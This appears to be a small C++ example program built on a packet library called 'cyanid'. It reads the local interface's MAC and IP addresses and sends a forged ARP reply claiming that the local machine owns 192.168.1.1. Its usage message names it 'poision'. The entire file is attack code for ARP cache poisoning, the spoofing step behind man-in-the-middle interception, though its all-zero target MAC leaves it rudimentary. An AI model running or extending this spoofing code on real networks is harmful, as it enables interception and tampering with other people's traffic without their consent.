#include <cyanid.hpp>
#include <iostream>

using namespace std;

class ARPListener : public cyanid::listener {
public:
    ARPListener(cyanid::device& dev) : cyanid::listener(dev)
    {
    }

protected:
    void handle_packet(const cyanid::raw_packet& packet)
    {
        std::cout << "Got a new packet" << std::endl;
    }
};

int main(int argc, char* argv[])
{
    if(argc < 2) {
        cerr << "Usage: poision INTERFACE" << endl;
        return 1;
    }

    const std::string iface = argv[1];

    cyanid::device device(iface);
    cyanid::basic_mac_addr* mac_addr = device.get_mac();
    cyanid::ip_addr ip_addr = device.get_ip();

    const std::string source_mac(cyanid::utils::addr_to_mac(mac_addr));
    const std::string source_ip(cyanid::utils::addr4_to_ip(ip_addr));

    cout << "Using interface: " << iface << endl
         << "MAC addr:        " << source_mac << endl
         << "IP addr:         " << source_ip << endl;

    ARPListener listener(device);
    listener.run();

    cyanid::packet packet(device);

    packet.build<cyanid::builder::arp>()(
            cyanid::builder::arp::REPLY,
            source_mac,
            source_ip,
            "00:00:00:00:00:00",
            "192.168.1.1");

    packet.build<cyanid::builder::ethernet>()(
            "00:00:00:00:00:00",
            cyanid::builder::arp::ETHER_TYPE);

    size_t bytes_written = packet.dispatch();
    cout << "Wrote " << bytes_written << " bytes to the network" << endl;

    return 0;
}
